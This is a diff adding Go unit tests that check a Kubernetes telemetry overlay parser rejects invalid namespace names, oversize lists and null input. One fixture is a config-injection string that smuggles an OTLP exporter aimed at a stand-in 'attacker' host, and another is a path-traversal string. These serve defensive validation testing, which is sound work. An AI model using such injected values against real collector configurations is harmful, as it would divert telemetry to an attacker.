@@ -1,6 +1,11 @@
 package collection
 
-import "testing"
+import (
+	"encoding/json"
+	"fmt"
+	"strings"
+	"testing"
+)
 
 func TestParseOverlay_Empty(t *testing.T) {
 	ov, err := ParseOverlay("")
@@ -37,6 +42,62 @@ func TestParseOverlay_RejectsUnknownFields(t *testing.T) {
 func TestParseOverlay_RejectsEmptyNamespaceEntry(t *testing.T) {
 	if _, err := ParseOverlay(`{"excludeNamespaces":[""]}`); err == nil {
 		t.Fatal("ParseOverlay accepted an empty namespace entry")
+	}
+}
+
+// Namespace strings are rendered into the sensor's collector config by the
+// applier, so anything that isn't a legal Kubernetes namespace name is
+// rejected here, at the trust boundary — a newline or quote would be config
+// injection downstream.
+func TestParseOverlay_RejectsInvalidNamespaceNames(t *testing.T) {
+	for _, name := range []string{
+		"prod\n  exporters:\n    otlp/evil:\n      endpoint: attacker:4317", // config injection
+		"   ",                   // whitespace-only
+		"ns\x00evil",            // NUL
+		"*",                     // glob
+		"../../etc/passwd",      // traversal-shaped
+		"UPPERCASE",             // not a DNS-1123 label
+		"under_score",           // not a DNS-1123 label
+		"-leading-dash",         // must start alphanumeric
+		"trailing-dash-",        // must end alphanumeric
+		strings.Repeat("a", 64), // over the 63-char namespace limit
+	} {
+		raw := `{"excludeNamespaces":["` + strings.ReplaceAll(strings.ReplaceAll(name, `\`, `\\`), "\n", `\n`) + `"]}`
+		if _, err := ParseOverlay(raw); err == nil {
+			t.Errorf("ParseOverlay accepted invalid namespace %q", name)
+		}
+	}
+}
+
+func TestParseOverlay_AcceptsValidNamespaceNames(t *testing.T) {
+	ov, err := ParseOverlay(`{"excludeNamespaces":["kube-system","payments","x","ns1-2-3"]}`)
+	if err != nil {
+		t.Fatalf("ParseOverlay rejected valid namespace names: %v", err)
+	}
+	if ov.ExcludeNamespaces == nil || len(*ov.ExcludeNamespaces) != 4 {
+		t.Fatalf("ExcludeNamespaces = %v, want 4 entries", ov.ExcludeNamespaces)
+	}
+}
+
+func TestParseOverlay_RejectsOversizeNamespaceList(t *testing.T) {
+	names := make([]string, maxExcludeNamespaces+1)
+	for i := range names {
+		names[i] = fmt.Sprintf("ns-%d", i)
+	}
+	blob, err := json.Marshal(map[string][]string{"excludeNamespaces": names})
+	if err != nil {
+		t.Fatalf("marshalling fixture: %v", err)
+	}
+	if _, err := ParseOverlay(string(blob)); err == nil {
+		t.Fatalf("ParseOverlay accepted %d namespaces, over the %d cap", len(names), maxExcludeNamespaces)
+	}
+}
+
+// A top-level null decodes into a struct as a no-op, so it would otherwise
+// read as the empty overlay and silently reset all collection config.
+func TestParseOverlay_RejectsNull(t *testing.T) {
+	if _, err := ParseOverlay("null"); err == nil {
+		t.Fatal("ParseOverlay accepted a top-level null — that would silently reset the overlay")
 	}
 }
 
